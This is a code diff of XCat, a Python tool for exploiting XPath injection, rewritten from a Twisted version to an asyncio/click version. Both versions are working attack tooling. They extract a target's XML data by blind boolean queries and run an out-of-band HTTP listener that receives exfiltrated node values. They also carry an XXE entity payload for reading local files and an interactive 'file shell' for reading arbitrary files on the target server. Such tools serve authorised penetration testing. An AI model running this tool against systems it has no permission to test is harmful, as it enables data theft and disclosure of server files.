@@ -1,490 +1,250 @@
-# XCat
-# Command line utility for extracting XML documents through XPath injection vulnerabilities
-import argparse
-from twisted.internet import reactor, defer
-from lib import SimpleXMLWriter
-from lib import payloads as payloadlib
-from twisted.web import server, resource
-import base64
-import sys
-import hashlib
-import time
-import copy
-import socket
-import itertools
+import asyncio
 
-__VERSION__ = 0.7
+import click
+import colorama
+import logbook
+import ipgetter
 
-writer = SimpleXMLWriter.XMLWriter(sys.stdout)
-
-class CountTypes:
-    LENGTH = 1
-    STRING  = 2
-    CODEPOINT = 3
+from .lib.requests.injectors import get_all_injectors
+from .lib.executors import xpath1, xpath2, docfunction
+from .lib.features.doc import DocFeature
+from .lib.features.xpath_2 import XPath2
+from .lib.features.entity_injection import EntityInjection
+from .lib.xpath import E, N, document_uri, doc
+from .lib.output import XMLOutput, JSONOutput
+from .lib.requests import detector
+from .lib.oob.http import OOBHttpServer
 
 
-@defer.inlineCallbacks
-def Count(payloads, node, count_type=CountTypes.STRING, _codepoint_count=None):
-    global args
-    MIN, MAX = (0, 10)
-    INC = 10
-    STEP = args.step_size
+colorama.init()
 
-    if count_type == CountTypes.LENGTH:
-        search_query = "GET_COUNT_LENGTH"
-        specific_query ="NODE_COUNT"
-    elif count_type == CountTypes.STRING:
-        if args.normalize_unicode:
-            search_query = "GET_COUNT_LENGTH_U"
-            specific_query = "NODE_COUNT_U"
-        else:
-            search_query = "GET_CONTENT_LENGTH"
-            specific_query = "NODEVALUE_LENGTH"
+
+@click.group()
+@click.argument("target")
+@click.argument("arguments")
+@click.argument("target_parameter")
+@click.argument("match_string")
+@click.option("--method", help="HTTP method to use", default="POST")
+
+@click.option("--true", "detection_method", flag_value="true", default=True, help="match_string indicates a true response")
+@click.option("--false", "detection_method", flag_value="false", help="match_string indicates a false response")
+#@click.option("--error", "detection_method", flag_value="error", help="match_string indicates an error response")
+
+@click.option("--loglevel", type=click.Choice(["debug", "info", "warn", "error"]), default="error")
+@click.option("--logfile", type=click.File("wb"), default="-")
+
+@click.option("--public-ip", default="autodetect", help="Public IP address to use with OOB connections")
+@click.pass_context
+def xcat(ctx, target, arguments, target_parameter, match_string, method, detection_method, loglevel, logfile, public_ip):
+    null_handler = logbook.NullHandler()
+    null_handler.push_application()
+
+    out_handler = logbook.StreamHandler(logfile, level=getattr(logbook, loglevel.upper()))
+    out_handler.push_application()
+
+    if detection_method == "true":
+        checker = lambda r, b: match_string in b
     else:
-        search_query = "GET_CODEPOINT_LENGTH"
-        specific_query = "GET_NODE_CODEPOINT"
-        MIN, MAX = (args.codepointstart, args.codepointstart+10)
+        checker = lambda r, b: not match_string in b
 
-        #INC = 20
-        #MAX = 20
-        STEP = 20
+    ctx.obj["detector"] = detector.Detector(target, method, arguments, target_parameter, checker=checker)
+    ctx.obj["target_param"] = target_parameter
 
-    # Check if its nill first
-    test = yield payloads.RunQuery(payloads.Get(specific_query)(node=node, count=0, index=_codepoint_count))
-    if test:
-        defer.returnValue(0)
+    if public_ip == "autodetect":
+        try:
+            public_ip = ipgetter.IPgetter().get_externalip()
+        except Exception:
+            click.echo("Could not detect public IP, please explicitly specify")
+            ctx.exit()
+        click.echo("External IP: {}".format(public_ip))
 
-    # Chop it into sections
+    # Hack Hack Hack:
+    # Setup an OOB http server instance on the doc feature class
+    DocFeature.server = OOBHttpServer(host=public_ip)
 
-    for i in xrange(STEP):
-        r = yield payloads.RunQuery(payloads.Get(search_query)(node=node,min=MIN,max=MAX,index=_codepoint_count))
-        #print payloads.Get(search_query)(node=node,min=MIN,max=MAX,index=_codepoint_count)
-        #raw_input("Count: r = %s"%r)
-        if not r:
-            MIN+=INC
-            MAX+=INC
+
+@xcat.group()
+@click.option("--injector", type=click.Choice(["autodetect"] + list(get_all_injectors().keys())),
+              default="autodetect", help="Type of injection to use.")
+@click.option("--xversion", type=click.Choice(["autodetect", "1","2"]),
+              default="autodetect", help="XPath version to use")
+@click.pass_context
+def run(ctx, injector, xversion):
+    detector = ctx.obj["detector"]
+
+    if injector == "autodetect":
+        injectors = run_then_return(get_injectors(detector, with_features=False))
+        if len(injectors) == 0:
+            click.echo("Could not autodetect a suitable injection, please explicitly specify")
+            ctx.exit(1)
+        elif len(injectors) > 1:
+            click.echo("Multiple ways to inject parameter, please specify.")
+            click.echo("Injectors: " + ", ".join([i.name() for i in injectors]))
+            click.echo("Run test_injection for more info")
+            ctx.exit(1)
+        injector = list(injectors.keys())[0]
+    else:
+        injector = get_all_injectors()[injector]
+
+    click.echo("Injecting using {}".format(injector.name()))
+
+    click.echo("Detecting features...")
+    features = run_then_return(detector.detect_features(injector))
+    click.echo("Supported features: {}".format(", ".join(feature.NAME for feature in features)))
+
+    if XPath2 not in features and xversion == "2":
+        click.echo("XPath version specified as 2 but could not detect XPath2 support. Will try anyway")
+
+    executor = xpath1.XPath1Executor
+
+    if xversion == "autodetect" and XPath2 in features:
+        executor = xpath2.XPath2Executor
+    elif xversion == "2":
+        executor = xpath2.XPath2Executor
+
+    if DocFeature in features:
+        executor = docfunction.DocFunctionExecutor
+
+    ctx.obj["injector"] = injector
+    ctx.obj["requester"] = detector.get_requester(injector, features=features)
+    ctx.obj["executor"] = executor(ctx.obj["requester"])
+
+
+@run.command(help="Attempt to retrieve the whole XML document")
+@click.option("--query", default="/*[1]", help="Query to retrieve. Defaults to root node (/*[1])")
+@click.option("--output", type=click.File('wb'), default="-", help="Location to output XML to")
+@click.option("--format", type=click.Choice(["xml", "json"]), default="xml", help="Format for output")
+@click.pass_context
+def retrieve(ctx, query, output, format):
+    click.echo("Retrieving {}".format(query))
+    executor = ctx.obj["executor"]
+
+    output_class = XMLOutput if format == "xml" else JSONOutput
+    run_then_return(display_results(output_class(output), executor, E(query)))
+
+
+@run.command(help="Read arbitrary files from the filesystem")
+@click.pass_context
+def file_shell(ctx):
+    # ToDo: Make this more like a shell, with a current directory etc. Make it more usable :)
+    click.echo("There are three ways to read files on the file system using XPath:")
+    click.echo(" 1. inject: Can read arbitrary text files as long as they do not contain any XML")
+    click.echo(" 2. comment: Can read arbitrary text files containing XML snippets, but cannot contain '-->'")
+    click.echo(" 3. doc: Reads valid XML files - does not support any other file type. Supports remote file URI's (http) and local ones.")
+    click.echo("Type doc, inject or comment to switch modes. Defaults to inject")
+    click.echo("Type uri to read the URI of the document being queried")
+    click.echo("Note: The URI should have a protocol, e.g: file:///test.xml. Bad things may happen if the URI does not exist, and it is best to use absolute paths.")
+
+    entity_injection = ctx.obj["requester"].get_feature(EntityInjection)
+
+    commands = {
+        "doc": lambda p: run_then_return(display_results(XMLOutput(), ctx.obj["executor"], doc(p).add_path("/*[1]"))),
+        "inject": lambda p: click.echo(run_then_return(entity_injection.get_file(ctx.obj["requester"], file_path))),
+        "comment": lambda p: click.echo(run_then_return(entity_injection.get_file(ctx.obj["requester"], file_path, True))),
+    }
+    numbers = {
+        "1": "inject",
+        "2": "comment",
+        "3": "doc"
+    }
+    mode = "inject"
+
+    while True:
+        file_path = click.prompt(">> ", prompt_suffix="")
+        if file_path == "uri":
+            executor = ctx.obj["executor"]
+            uri = run_then_return(
+                executor.get_string(document_uri(N("/")))
+            )
+            click.echo("URI: {}".format(uri))
+        elif file_path in commands or file_path in numbers:
+            if file_path in numbers:
+                file_path = numbers[file_path]
+            mode = file_path
+            click.echo("Switched to {}".format(mode))
         else:
-            tlist = []
-            for i in xrange(MIN, MAX+1):
-                tlist.append(payloads.RunQuery(payloads.Get(specific_query)(node=node,index=_codepoint_count, count=i, value=chr(i))))
-            results = yield defer.gatherResults(tlist)
-            if not any(results):
-                defer.returnValue(0)
-            defer.returnValue(MIN+results.index(True))
-
-
-class DocRequestHandler(resource.Resource):
-    isLeaf = True
-
-    def __init__(self):
-        resource.Resource.__init__(self)
-        self.ids = {}
-
-    def AddConnection(self):
-        id = hashlib.md5(str(time.time())).hexdigest()
-        self.ids[id] = None
-        return id
-
-    def GetResult(self, id):
-        return self.ids.get(id,None)
-
-    def render_GET(self, request):
-        if request.args.get("id",None):
-            t = request.args.get("id")[0]
-            id,value = t.split("-",1)
-
-            if id not in self.ids:
-                return sys.stderr.write("Error: query ID %s does not exist"%id)
-            self.ids[id] = value
-
-        return "<emptynode></emptynode>"
-
-class LocalFileRequestHandler(resource.Resource):
-    isLeaf = True
-
-    def render_GET(self, request):
-        # There is proberbly a much nicer way to code this, but whatever.
-        if request.args.get("t",None):
-            return """
-<!DOCTYPE stuff [
-<!ELEMENT data ANY>
-<!ENTITY c "ok">
-]>
-<data>&c;</data>"""
-
-        if request.args.get("p",None):
             try:
-                path = base64.urlsafe_b64decode(request.args.get("p")[0])
-            except Exception:
-                return ""
-
-            return """
-<!DOCTYPE stuff [
-<!ELEMENT data ANY>
-<!ENTITY c SYSTEM "%s">
-]>
-<data>&c;</data>"""%path
-
-        return ""
+                commands[mode](file_path)
+            except Exception as e:
+                click.echo("Error reading file. Try another mode")
 
 
-class DocServerHandler(server.Site):
-    def log(self, *args, **kwargs):
-        return # Do nothing
 
-@defer.inlineCallbacks
-def GetCharacters(payloads, node, size=0, count_it=False):
-    global args
-    if count_it and not args.connectback:
-        size = yield Count(payloads, node=node, count_type=CountTypes.STRING)
-        #raw_input("\nGot size %s for node %s"%(size, node))
+@run.command(help="Get the URI of the document being queried")
+@click.pass_context
+def get_uri(ctx):
+    click.echo("Retrieving URI...")
+    executor = ctx.obj["executor"]
+    uri = run_then_return(
+        executor.get_string(document_uri(N("/")))
+    )
+    click.echo("URI: {}".format(uri))
 
-    if args.connectback:
-        global rhandler
-        id = rhandler.AddConnection()
-        yield payloads.RunQuery(payloads.Get("HTTP_TRANSFER")(node=node, id=id, host=args.connectback))
-        info = rhandler.GetResult(id)
-        defer.returnValue(info or "")
-    else:
-        returner = []
-        _counter = 0
-        while True:
-            _counter+=1
-            if not size == 0:
-                if _counter > size:
-                    break
+@xcat.command(help="Test parameter for injectability")
+@click.pass_context
+def test_injection(ctx):
+    detector = ctx.obj["detector"]
 
-            _found = False
-            if args.xversion == "1":
-                for char in (payloads.GetSearchSpace()):
-                    r = yield payloads.RunQuery(payloads.Get("GET_NODE_SUBSTRING")(node=node, count=_counter, character=char))
-                    if r:
-                        returner.append(char)
-                        _found = True
-                        break
-            else:
-                r = yield Count(payloads, node, count_type=CountTypes.CODEPOINT, _codepoint_count=_counter)
-                #raw_input("GetCharacters: r = %s"%r)
-                if r:
-                    returner.append(chr(r))
-                    _found = True
+    click.echo("Testing parameter {}:".format(ctx.obj["target_param"]))
 
-            if not _found:
-                break
+    injectors = run_then_return(get_injectors(detector, with_features=True))
 
-        defer.returnValue("".join(returner))
+    if len(injectors) == 0:
+        click.echo("Could not inject into parameter. Are you sure it is vulnerable?")
 
-@defer.inlineCallbacks
-def GetXMLFromDefinedQuery(payloads, node):
-    # Count the set
-    count = yield Count(payloads, node=node.replace("$COUNT","*"), count_type=CountTypes.LENGTH)
+    for injector, features in injectors.items():
+        injector_example = "{}:\t\t{}".format(injector.__class__.__name__, injector.EXAMPLE)\
+            .replace("?", colorama.Fore.GREEN + "?" + colorama.Fore.RESET)
+        click.echo(injector_example)
 
-    if not count:
-        print "Found 0 nodes to extract, exiting"
-    else:
-        print "Found %s nodes to extract"%count
-
-        for i in xrange(1, count+1):
-            _c = node.replace("$COUNT",str(i))
-            yield GetXMLFromNode(payloads, _c)
+        for feature in features:
+            click.echo("\t- {}".format(feature.__name__))
 
 
-@defer.inlineCallbacks
-def GetXMLFromNode(payloads, node):
-    global args
-    #print "Node: %s"%node
-    node_name = yield GetCharacters(payloads, "name(%s)"%node, count_it=True)
-    attribute_count = yield Count(payloads, node=node+"/@*", count_type=CountTypes.LENGTH)
-    attributes = {}
-    if attribute_count:
-        for i in xrange(1, attribute_count+1):
-            attribute = yield GetCharacters(payloads, "name(%s)"%(node+"/@*[%s]"%i))
-            if not args.schema_only:
-                value     = yield GetCharacters(payloads, node+"/@*[%s]"%i)
-            else:
-                value = ""
-            #raw_input("Got attribute '%s' value '%s'"%(attribute, value))
-            attributes[attribute] = value
-
-    writer.start(node_name, attrib=attributes)
-
-    if not args.schema_only and not args.ignore_comments:
-        commentCount = yield Count(payloads, node+"/comment()", count_type=CountTypes.LENGTH)
-        if commentCount:
-            for i in xrange(1, commentCount+1):
-                comment = yield GetCharacters(payloads, node+"/comment()[%s]"%i, count_it=True)
-                if comment:
-                    writer.comment(comment)
-
-    child_node_count = yield Count(payloads, node=node+"/*", count_type=CountTypes.LENGTH)
-    #print "Child node count: %s"%child_node_count
-    if child_node_count:
-        for i in xrange(1, child_node_count+1):
-            yield GetXMLFromNode(payloads, node+"/*[%s]"%i)
-
-    if not args.schema_only:
-        text_count = yield Count(payloads, node=node+"/text()", count_type=CountTypes.LENGTH)
-        if text_count is None:
-            sys.stderr.write("Fetching node %s text failed, perhaps increase step-size or ensure target is injectible"%node)
-        else:
-            for i in xrange(1,text_count+1):
-                value = yield GetCharacters(payloads, node+"/text()[%s]"%i, count_it=True)
-                if value:
-                    writer.data(value)
-
-    writer.end()
+@asyncio.coroutine
+def get_injectors(detector, with_features=False):
+    injectors = yield from detector.detect_injectors()
+    if not with_features:
+        return {i:[] for i in injectors}
+    # Doesn't work it seems. Shame :(
+    #return{injector: (yield from detector.detect_features(injector))
+    #        for injector in injectors}
+    returner = {}
+    for injector in injectors:
+        returner[injector] = (yield from detector.detect_features(injector))
+    return returner
 
 
-@defer.inlineCallbacks
-def DetectEntityInjection(args):
-    _r = yield payloads.RunQuery(payloads.Get("ENTITY_INJECTION_TEST")(host=args.connectback))
-    defer.returnValue(_r)
+@asyncio.coroutine
+def display_results(output, executor, target_node, first=True):
+    if first:
+        output.output_started()
 
-@defer.inlineCallbacks
-def TestTransfer(args):
-    global rhandler
-    id = rhandler.AddConnection()
-    yield payloads.RunQuery(payloads.Get("HTTP_TRANSFER_TEST")(id=id, host=args.connectback))
-    i = rhandler.GetResult(id)
-    defer.returnValue(i)
+    children = []
+    node = yield from executor.retrieve_node(target_node)
+    output.output_start_node(node)
 
-@defer.inlineCallbacks
-def DetectQuoteCharacter(args):
-    for qcharacter in ("'",'"'):
-        args.quote_character = qcharacter
-        pmaker = payloadlib.PayloadMaker(args)
-        r = yield pmaker.RunQuery(pmaker.Get("QUOTE_CHARACTER_TEST")())
-        if r:
-            defer.returnValue(qcharacter)
-    defer.returnValue(None)
+    if node.child_count > 0:
+        for child in target_node.children(node.child_count):
+            children.append((yield from display_results(output, executor, child, first=False)))
 
-def MakeListener(site, port, iface):
-    return reactor.listenTCP(port, site, interface=iface)
+    output.output_end_node(node)
+    data = node._replace(children=children)
 
-@defer.inlineCallbacks
-def Main(args):
-    global payloads
-    payloads = payloadlib.PayloadMaker(args)
+    if first:
+        output.output_finished()
 
-    if args.autopwn:
-        print " * Automatically detecting available features..."
-        sys.stdout.write("   * Detecting quote: ")
-        quote_char = yield DetectQuoteCharacter(copy.deepcopy(args))
-        if not quote_char:
-            sys.stdout.write("Could not detect, leaving as %s\n"%args.quote_character)
-        else:
-            sys.stdout.write(quote_char+"\n")
-            args.quote_character = quote_char
-
-        sys.stdout.write("   * XPath Version: ")
-        xversion = yield payloads.DetectXPathVersion()
-        sys.stdout.write("%s\n"%xversion)
-        args.xversion = xversion
-        if args.xversion != "1":
-            sys.stdout.write("   * OOB HTTP Support: \n")
-            new_args = copy.deepcopy(args)
-            ip_addrs = [r[4][0] for r in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET)]
-            for ip,port in zip(ip_addrs,itertools.cycle([80,53])):
-                new_args.connectback = "%s:%s"%(ip,port)
-                sys.stdout.write("     * %s: "%new_args.connectback)
-                listener = MakeListener(site, port, ip)
-                if TestTransfer(new_args):
-                    sys.stdout.write("Success\n")
-                    args.connectback = new_args.connectback
-                    break
-                else:
-                    sys.stdout.write("Failed\n")
-                    listener.stopListening()
-            sys.stdout.flush()
-            sys.stdout.write("   * Entity Injection Retrieval: ")
-            inj = yield DetectEntityInjection(args)
-            if inj: print "Supported"
-            else:   print "Unsupported"
+    return data
 
 
-    if args.xversion == "auto":
-        xversion = yield payloads.DetectXPathVersion()
-        sys.stderr.write("Detected XPath version %s\n"%xversion)
+def run_then_return(generator):
+    future = asyncio.Task(generator)
+    asyncio.get_event_loop().run_until_complete(future)
+    return future.result()
 
-    if args.error_keyword and args.xversion == "1":
-        sys.stderr.write("Error based detection is unavailable when attacking targets running XPath 1.0\n")
-        exit()
 
-    if args.connectback and args.xversion == "1":
-        sys.stderr.write("Connectback is only supported with XPath 2.0")
-        exit()
-
-    sys.stderr.write("Exploiting...\n")
-    t1 = time.time()
-    if args.getcwd:
-        if not args.xversion == "2":
-            sys.stderr.write("Working file detection is only supported in XPath 2.0")
-            exit()
-        #payloads.SetSearchSpace(string.ascii_letters + string.punctuation + string.digits + " ")
-        cwd = yield GetCharacters(payloads, "document-uri(/)")
-        print "Working file: %s"%cwd
-    elif args.executequery:
-        yield GetXMLFromDefinedQuery(payloads, args.executequery)
-    elif args.fileshell:
-
-        can_use_entity = yield DetectEntityInjection(args)
-        if can_use_entity:
-            print " * Entity injection appears to be working"
-        else:
-            print " * Entity injection is not available, using doc() fallback (only works on xml files)"
-
-        _grabs = {"--doc":0,"--entity":1}
-
-        grab_using = 0 # 0 = use Doc(), 1 = use READ_LOCAL_FILE
-
-        print "Enter a file URI. Available commands:"
-        print " * --getcwd : Returns the URI of the current document"
-        print " * --doc    : Use doc() to fetch files. Only works on XML files and returns the whole document"
-        if can_use_entity:
-            print " * --entity : Use entity injection to fetch files. Works best on text files with no XML characters in them (<,>,--). Must be absolute."
-        print "   -> Using doc() to fetch documents"
-        while True:
-            try:
-                file_path = raw_input("URI: ")
-            except EOFError:
-                file_path = ""
-
-            if file_path == "":
-                break
-            else:
-                if file_path == "--getcwd":
-                    cwd = yield GetCharacters(payloads, "document-uri(/)")
-                    print "Working file: %s"%cwd
-                    continue
-
-                if file_path in _grabs:
-                    grab_using = _grabs[file_path]
-                    print "Using %s method to get files"%(file_path.strip("--"))
-                    continue
-
-                if grab_using == 1:
-                    fpath = base64.urlsafe_b64encode(file_path)
-                    output = yield GetCharacters(payloads, payloads.Get("READ_LOCAL_FILE", wrap_base=False)(path=fpath,
-                                                                                            host=args.connectback, node="data/string()"))
-                    print output
-                else:
-                    yield GetXMLFromDefinedQuery(payloads, ("doc('%s')/*[$COUNT]"%file_path).replace("'", args.quote_character))
-                    print ""
-
-    else:
-        yield GetXMLFromNode(payloads, "/*[1]")
-    t2 = time.time()
-    if args.timeit:
-        sys.stderr.write("\nTime taken: %s\n"%str(t2-t1))
-    reactor.stop()
-
-@defer.inlineCallbacks
-def StartMain(args):
-    try:
-        yield Main(args)
-    except SystemExit:
-        reactor.stop()
+def run():
+    xcat(obj={})
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Read a remote XML file through an XPath injection vulnerability")
-    parser.add_argument("--method", help="HTTP method to send", action="store",
-        default="GET", choices=["GET","POST"], dest="http_method")
-    parser.add_argument("--arg", help="POST or GET argument(s) to send. The payload will be appended", type=str, action="store",
-        dest="post_argument")
-
-    detection = parser.add_mutually_exclusive_group()
-
-    group = detection.add_mutually_exclusive_group()
-    group.add_argument("--true", help="Keyword that if present indicates a success", dest="true_keyword")
-    group.add_argument("--false", help="Keyword that if present indicates a failure (And if not present indicates a success)", dest="false_keyword")
-    group.add_argument("--error", help="Keyword that if present indicates a server error. Used for exploiting injection vectors that give no output, but can be caused to error",
-        dest="error_keyword")
-
-    group2 = detection.add_mutually_exclusive_group()
-    group2.add_argument("--true-code", help="The HTTP status code that indicates a success", dest="true_code", type=int)
-    group2.add_argument("--false-code", help="The HTTP status code that indicates a failure", dest="fail_code", type=int)
-    group2.add_argument("--error-code", help="The HTTP status code that indicates a server error", dest="error_code", type=int)
-
-    parser.add_argument("--autopwn", help="Automatically detect and setup available features (Quote character, version, connectback support, cwd, entity retrieval support",
-                                    action="store_true", dest="autopwn")
-
-    parser.add_argument("--schema-only", help="Only extract the node names and no text data or attribute values", action="store_true", dest="schema_only")
-    parser.add_argument("--quotecharacter", help="The quote character we will use to inject (normally ' or \")", default="\"", dest="quote_character")
-    parser.add_argument("--executequery", help="If given recurse through this query and extract the results, instead of searching from the root node. use $COUNT to insert the current node we are looking at. eg: /users/user[$COUNT]/password",
-        default="", dest="executequery")
-
-    parser.add_argument("--max_search", help="The max number of characters to search to before giving up", dest="search_limit", type=int, default=20)
-    parser.add_argument("--timeout", help="Socket timeout to set", type=int, default=5, dest="timeout", action="store")
-    parser.add_argument("--stepsize", help="When counting text contents (which could be very large) this is the max number of characters to count up to, times by ten",
-        type=int, default=10, dest="step_size", action="store")
-    parser.add_argument("--normalize", help="Normalize unicode", choices=["NFD","NFC","NFDK","NFKC"], action="store", dest="normalize_unicode")
-    parser.add_argument("--xversion", help="The xpath version to use", choices=["1","2","auto"], default="auto", action="store",dest="xversion")
-    parser.add_argument("--lowercase", help="Speed up retrieval time by making all text lowercase before searching. Xpath 2.0 only",
-        default=False, dest="lowercase", action="store_true")
-    parser.add_argument("--regex", help="Use Regex to reduce the search space of text. Xpath 2.0 only",
-        default=False, dest="use_regex", action="store_true")
-    #group2 = parser.add_mutually_exclusive_group()
-    #group2.add_argument("--dns", help="Experimental: Use DNS requests to transfer data. XPath 2.0 only. This parameter is the end of the hostname. Only works with alphanumeric characters, 64character limit (in total).",
-    #                             action="store", dest="dns_location")
-
-    parser.add_argument("--connectback", help="IP Address and port to listen on for connectback when using connectback OOB attacks, e.g 10.20.30.40:80", action="store", dest="connectback", default=False)
-
-    parser.add_argument("--notfoundstring", help="The character to place when a character cannot be found in the searchspace", action="store", dest="notfoundchar", default="?")
-    parser.add_argument("--fileshell", help="Launch a shell for browing remote files", action="store_true", dest="fileshell")
-    parser.add_argument("--getcwd", help="Retrieve the XML documents URI that the server is executing our query against", action="store_true", dest="getcwd")
-    parser.add_argument("--useragent", help="User agent to use", action="store", dest="user_agent", default="XCat %s"%__VERSION__)
-    parser.add_argument("--cookie", help="Cookie to use", action="store", dest="cookie")
-    parser.add_argument("--timeit", help="Time the retrieval", action="store_true", dest="timeit", default=False)
-    parser.add_argument("--ignorecomments", help="Don't extract document comments", action="store_true", dest="ignore_comments", default=False)
-    parser.add_argument("--codepointstart", help="Number to start searching at when using codepoints and XPath 2.0. Defaults to 0", action="store", dest="codepointstart",
-                                            default=0, type=int)
-    #parser.add_argument("--existdb", help="Enable exist-db compatability mode. Use this if you are injecting a query that is executed by an eXist-DB process", action="store_true", dest="exist_compat", default=False)
-    parser.add_argument("URL", action="store")
-    args = parser.parse_args()
-
-    sys.stderr.write("XCat version %s\n"%__VERSION__)
-
-    if not any([args.false_keyword, args.true_keyword, args.error_keyword]):
-        sys.stderr.write("Error: You must supply a false, true or error keyword\n")
-        exit()
-
-    if not args.post_argument:
-        sys.stderr.write("Error: no POST/GET arguments supplied!\n")
-        exit()
-
-    if "{0}" not in args.post_argument:
-        args.post_argument = "%s{0}"%args.post_argument
-
-    if args.http_method == "POST":
-        if not args.post_argument:
-            sys.stderr.write("Error: You must supply some POST arguments if you are making a POST request!\n")
-            exit()
-
-
-    if args.true_keyword:
-        args.lookup = True
-    else:
-        args.lookup = False
-
-    rhandler = DocRequestHandler()
-    fhandler = LocalFileRequestHandler()
-
-    res = resource.Resource()
-    res.putChild("doc",rhandler)
-    res.putChild("file",fhandler)
-
-    site = DocServerHandler(res)
-    if args.connectback:
-        if len(args.connectback.split(":")) == 1:
-            args.connectback_port = 80
-            args.connectback = "%s:%s"%(args.connectback, args.connectback_port)
-        else:
-            host,port = args.connectback.split(":")
-            args.connectback_port = port
-        print "Connecback running on %s"%args.connectback
-        reactor.listenTCP(int(args.connectback_port), site, interface=args.connectback.split(":")[0])
-
-
-    reactor.callWhenRunning(StartMain, args)
-
-    reactor.run()
+    run()
